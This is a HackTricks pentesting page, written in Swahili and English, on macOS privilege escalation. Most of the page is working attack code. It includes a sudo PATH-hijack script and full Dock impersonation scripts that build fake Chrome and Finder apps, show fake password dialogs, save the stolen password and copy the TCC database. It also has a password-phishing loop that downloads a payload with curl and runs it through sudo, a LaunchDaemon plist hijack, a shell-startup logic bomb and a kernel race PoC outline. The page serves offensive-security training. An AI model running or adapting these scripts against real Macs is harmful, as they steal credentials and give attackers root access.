# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ikiwa umefika hapa ukitafuta TCC privilege escalation, nenda:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Tafadhali kumbuka kwamba **mbinu nyingi za privilege escalation zinazoathiri Linux/Unix zitaathiri pia** mashine za MacOS. Kwa hivyo angalia:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Unaweza kupata mbinu asili ya [Sudo Hijacking ndani ya chapisho la Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Hata hivyo, macOS **hudumisha** **`PATH`** ya mtumiaji anapotumia **`sudo`**. Hii inamaanisha kwamba njia nyingine ya kutekeleza shambulio hili ni **kuhijack binaries nyingine** ambazo mwathiriwa bado atazitekeleza anapoendesha **sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Kumbuka kwamba mtumiaji anayetumia **terminal** huenda sana akawa na **Homebrew installed**. Kwa hiyo, inawezekana kuteka nyara binaries zilizo katika **`/opt/homebrew/bin`**.

### Uigaji wa Dock

Kwa kutumia **social engineering**, unaweza **kuiga**, kwa mfano, Google Chrome ndani ya dock na kwa hakika kutekeleza script yako mwenyewe:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Baadhi ya mapendekezo:

- Kagua Dock kuona ikiwa kuna Chrome, na ikiwa ipo, **ondoa** ingizo hilo kisha **ongeza** ingizo la **fake** la **Chrome** katika nafasi ileile ndani ya array ya Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Baadhi ya mapendekezo:

- **Huwezi kuondoa Finder kwenye Dock**, kwa hivyo ikiwa utaiongeza kwenye Dock, unaweza kuweka Finder bandia karibu kabisa na ile halisi. Ili kufanya hivyo, unahitaji **kuongeza ingizo la Finder bandia mwanzoni mwa array ya Dock**.
- Chaguo jingine ni kutoipachika kwenye Dock na kuifungua tu; "Finder asking to control Finder" si jambo la ajabu sana.
- Chaguo jingine la **ku-escalate hadi root bila kuomba** password kwa kutumia kisanduku cha mazungumzo kibaya, ni kufanya Finder iombe password kweli ili kutekeleza kitendo chenye privilege:
- Iambie Finder ikopi **`/etc/pam.d`** faili mpya ya **`sudo`** (prompt inayoomba password itaonyesha kwamba "Finder wants to copy sudo")
- Iambie Finder ikopi **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili prompt inayoomba password ionyeshe kwamba "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware mara nyingi hutumia mwingiliano wa mtumiaji **kukamata password yenye uwezo wa kutumia sudo** na kuitumia tena kwa njia ya program. Mtiririko wa kawaida:

1. Tambua mtumiaji aliyeingia kwa kutumia `whoami`.
2. **Rudia password prompts** hadi `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
3. Hifadhi credential kwenye cache (kwa mfano, `/tmp/.pass`) na endesha vitendo vyenye privileges kwa kutumia `sudo -S` (password kupitia stdin).

Mfano wa minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Nenosiri lililoibwa linaweza kutumiwa tena **kuondoa quarantine ya Gatekeeper kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye privileged access, na kuendesha stages za ziada bila mwingiliano wa mtumiaji.<sup>[[1]](#references)</sup>

## Vectors mpya maalum kwa macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` iliyo deprecated bado inaweza kutumika

`AuthorizationExecuteWithPrivileges` iliwekwa deprecated katika 10.7 lakini **bado inafanya kazi kwenye Sonoma/Sequoia**. Commercial updaters nyingi huendesha `/usr/libexec/security_authtrampoline` pamoja na path isiyoaminika. Ikiwa binary inayolengwa inaweza kuandikwa na user, unaweza kupandikiza trojan na kutumia prompt halali:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Unganisha na **masquerading tricks hapo juu** ili kuwasilisha password dialog inayoaminika.


### Privileged helper / XPC triage

Sehemu kubwa ya macOS privescs za kisasa kutoka kwa wahusika wengine hufuata muundo uleule: **root LaunchDaemon** hufichua **Mach/XPC service** kutoka **`/Library/PrivilegedHelperTools`**, kisha helper ama **haithibitishi client**, huithibitisha **ikiwa imechelewa sana** (PID race), au hufichua **root method** inayotumia **path/script inayodhibitiwa na mtumiaji**. Hii ndiyo bug class inayohusika na helper bugs nyingi za hivi karibuni katika VPN clients, game launchers na updaters.<sup>[[2]](#references)</sup>

Orodha fupi ya ukaguzi wa triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Zingatia kwa makini helpers ambazo:

- zinaendelea kukubali requests **baada ya uninstall** kwa sababu job iliendelea kuwa loaded katika `launchd`
- zina-execute scripts au kusoma configuration kutoka **`/Applications/...`** au paths nyingine zinazoweza kuandikwa na users wasio-root
- zinategemea uthibitishaji wa peer unaotumia **PID-based** au **bundle-id-only**, ambao unaweza kuwa raceable

Kwa maelezo zaidi kuhusu bugs za helper authorization, angalia [ukurasa huu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

Hadi Apple ilipoirekebisha katika **Sonoma 14.5**, **Ventura 13.6.7** na **Monterey 12.7.5**, installs zilizoanzishwa na user kupitia **`Installer.app`** / **`PackageKit.framework`** zingeweza ku-execute **PKG scripts kama root ndani ya environment ya user wa sasa**. Hii inamaanisha kuwa package iliyotumia **`#!/bin/zsh`** inge-load **`~/.zshenv`** ya attacker na kui-run kama **root** wakati victim aki-install package.<sup>[[3]](#references)</sup>

Hili linavutia hasa kama **logic bomb**: unahitaji tu foothold katika account ya user na shell startup file inayoweza kuandikwa, kisha unasubiri installer yoyote iliyo hatarini na inayotumia **zsh** i-execute na user. Hili kwa ujumla **halitumiki kwa** deployments za **MDM/Munki**, kwa sababu hizo hu-run ndani ya environment ya root user.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Ikiwa unataka kuchunguza kwa kina zaidi matumizi mabaya maalum ya installers, pia angalia [ukurasa huu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Ikiwa LaunchDaemon plist au lengo lake la `ProgramArguments` ni **user-writable**, unaweza kufanya escalate kwa kuibadilisha kisha kulazimisha launchd kuipakia upya:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
This mirrors the exploit pattern published for **CVE-2025-24085**, ambapo plist inayoweza kuandikwa ilitumiwa kutekeleza code ya mshambuliaji kama root.

### XNU SMR credential race (CVE-2025-24118)

A **race katika `kauth_cred_proc_update`** humwezesha mshambuliaji wa ndani kuharibu pointer ya credential ya kusomeka tu (`proc_ro.p_ucred`) kwa kuendesha loops za `setgid()`/`getgid()` katika threads mbalimbali hadi `memcpy` iliyokatika itokee. Uharibifu uliofanikiwa hutoa **uid 0** na ufikiaji wa memory ya kernel. Muundo wa chini kabisa wa PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Iunganishe na heap grooming ili kuweka data inayodhibitiwa mahali ambapo pointer inasomwa tena. Kwenye builds zilizo hatarini, hii ni **local kernel privesc** ya kuaminika bila mahitaji ya SIP bypass.<sup>[[4]](#references)</sup>

### SIP bypass kupitia Migration Assistant ("Migraine", CVE-2023-32369)

Ikiwa tayari una root, SIP bado huzuia uandishi kwenye maeneo ya mfumo. Bug ya **Migraine** hutumia entitlement ya Migration Assistant `com.apple.rootless.install.heritable` kuanzisha child process inayorithi SIP bypass na kuandika upya paths zilizolindwa (kwa mfano, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Mnyororo huu ni:

1. Pata root kwenye mfumo unaoendelea kufanya kazi.
2. Trigger `systemmigrationd` kwa state iliyoundwa ili iendeshe binary inayodhibitiwa na mshambuliaji.
3. Tumia entitlement iliyorithiwa kurekebisha files zinazolindwa na SIP, na hivyo kudumu hata baada ya reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Apple daemons nyingi hukubali objects za **NSPredicate** kupitia XPC na huthibitisha tu sehemu ya `expressionType`, ambayo inadhibitiwa na mshambuliaji. Kwa kuunda predicate inayotathmini selectors kiholela, unaweza kufanikisha **code execution katika root/system XPC services** (kwa mfano, `coreduetd`, `contextstored`). Ikiunganishwa na app sandbox escape ya awali, hii hutoa **privilege escalation bila user prompts**. Tafuta XPC endpoints zinazodeserialize predicates na zisizo na visitor thabiti.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Mtumiaji yeyote** (hata asiye na privileges) anaweza kuunda na ku-mount Time Machine snapshot kwa `-o noowners` na **kufikia files ZOTE** za snapshot hiyo, akipita ownership checks kwenye live volume. Privilege pekee inayohitajika ni kwamba application inayotumiwa (kama `Terminal`) iwe na **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Commands na maelezo kamili yanapatikana kwenye ukurasa wa TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Hii inaweza kuwa muhimu kwa kufanya privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Pentest Partners - 2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
